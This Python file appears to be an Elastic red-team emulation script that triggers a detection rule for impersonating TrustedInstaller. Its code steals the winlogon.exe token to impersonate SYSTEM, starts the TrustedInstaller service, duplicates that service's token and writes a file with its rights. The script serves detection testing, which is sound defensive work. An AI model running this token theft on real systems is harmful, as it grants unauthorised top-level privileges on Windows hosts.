# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata
import ctypes, win32gui, win32process, win32event, win32api, win32security, win32file, win32service, sys, time, os


BOOL    = ctypes.c_int
DWORD   = ctypes.c_uint32
HANDLE  = ctypes.c_void_p
LONG    = ctypes.c_int32
NULL_T  = ctypes.c_void_p
SIZE_T  = ctypes.c_uint
TCHAR   = ctypes.c_char
USHORT  = ctypes.c_uint16
UCHAR   = ctypes.c_ubyte
ULONG   = ctypes.c_uint32

TH32CS_SNAPPROCESS = 0x00000002
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
TOKEN_DUPLICATE = 0x0002
TOKEN_ALL_ACCESS = 0xf00ff
MAX_PATH = 260

BOOL    = ctypes.c_int
DWORD   = ctypes.c_uint32
HANDLE  = ctypes.c_void_p
LONG    = ctypes.c_int32
NULL_T  = ctypes.c_void_p
SIZE_T  = ctypes.c_uint
TCHAR   = ctypes.c_char
USHORT  = ctypes.c_uint16
UCHAR   = ctypes.c_ubyte
ULONG   = ctypes.c_uint32

class PROCESSENTRY32(ctypes.Structure):
   _fields_ = [
        ('dwSize',              DWORD),
        ('cntUsage',            DWORD),
        ('th32ProcessID',       DWORD),
        ('th32DefaultHeapID',   NULL_T),
        ('th32ModuleID',        DWORD),
        ('cntThreads',          DWORD),
        ('th32ParentProcessID', DWORD),
        ('pcPriClassBase',      LONG),
        ('dwFlags',             DWORD),
        ('szExeFile',           TCHAR * MAX_PATH)
    ]


metadata = RtaMetadata(
    uuid="6373e944-52c8-4199-8ca4-e88fd6361b9c",
    platforms=["windows"],
    endpoint=[{'rule_id': 'cc35ee3e-d350-4319-b7f3-ea0d991ce4d9', 'rule_name': 'Suspicious Impersonation as Trusted Installer'}],
    siem=[],
    techniques=["T1134"],
)

@common.requires_os(metadata.platforms)

def getppid(pname):
    CreateToolhelp32Snapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot 
    Process32First = ctypes.windll.kernel32.Process32First  
    Process32Next = ctypes.windll.kernel32.Process32Next 
    CloseHandle = ctypes.windll.kernel32.CloseHandle 
    
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) 
    pe32 = PROCESSENTRY32() 
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
    current_pid = os.getpid()
    

    if Process32First(hProcessSnap, ctypes.byref(pe32)) == 0:
     print("[x] - Failed getting first process.") 
     return
   
    while True:
        procname = pe32.szExeFile.decode("utf-8").lower()
        if pname.lower() in procname:
          return pe32.th32ProcessID
        if not Process32Next(hProcessSnap, ctypes.byref(pe32)): 
         return None
    CloseHandle(hProcessSnap)

def startsvc_trustedinstaller():
    try:
       hscm = win32service.OpenSCManager(None,None,win32service.SC_MANAGER_ALL_ACCESS)
       hs = win32service.OpenService(hscm, "TrustedInstaller", win32service.SERVICE_START)
       win32service.StartService(hs, "30")
       win32service.CloseServiceHandle(hscm)
       win32service.CloseServiceHandle(hs)
       print('[*] - TrustedInstaller service started')
    except Exception as e:
           print('[x] - Failed to start TrustedInstaller service, probably already started')
           pass
def impersonate_system(): 
     try: 
        hp = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, getppid("winlogon.exe"))
        th = win32security.OpenProcessToken(hp, TOKEN_DUPLICATE)
        new_tokenh = win32security.DuplicateTokenEx(th, 2, TOKEN_ALL_ACCESS , win32security.TokenImpersonation , win32security.SECURITY_ATTRIBUTES())
        win32security.ImpersonateLoggedOnUser(new_tokenh)
        print('[*] - Impersonated System Token via Winlogon')
        win32api.CloseHandle(hp)
     except Exception as e:
            print('[x] - Failed To Impersonate System Token via Winlogon')

def impersonate_trusted_installer():
    try:
        hp = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, getppid("TrustedInstaller.exe"))
        th = win32security.OpenProcessToken(hp, TOKEN_ALL_ACCESS)
        new_tokenh = win32security.DuplicateTokenEx(th, 2, TOKEN_ALL_ACCESS , win32security.TokenImpersonation , win32security.SECURITY_ATTRIBUTES())
        win32security.ImpersonateLoggedOnUser(new_tokenh) 
        print('[*] - Impersonated TrustedInstaller service')
        hf = win32file.CreateFile("rta_ti.txt", win32file.GENERIC_WRITE, 0, None, 2, 0, None)
        win32file.WriteFile(hf,("AAAAAAAA").encode()) 
        win32file.CloseHandle(hf)
        win32api.CloseHandle(hp)
        print('[*] - Created File rta_ti.txt as the TrustedInstaller service')
        win32file.DeleteFile("rta_ti.txt")
        print('[*] - Deleted rta_ti.txt')
    except Exception as e:
            print('[x] - Failed TrustedInstaller Impersonation')
            pass 
        
def main():
   impersonate_system()
   startsvc_trustedinstaller()
   impersonate_trusted_installer()

if __name__ == "__main__":
    exit(main()) 